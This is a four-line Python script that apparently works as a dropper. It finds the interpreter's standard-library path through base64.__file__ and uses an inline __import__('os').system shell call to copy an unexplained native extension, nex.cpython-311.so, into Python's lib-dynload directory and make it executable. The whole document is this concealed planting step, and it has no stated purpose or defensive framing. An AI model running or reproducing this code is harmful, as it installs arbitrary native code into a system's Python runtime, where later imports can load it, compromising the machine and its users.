import base64
k = base64.__file__
i = k.replace('base64.py','lib-dynload')
__import__('os').system(f'cp nex.cpython-311.so {i} && chmod +x {i}/nex.cpython-311.so')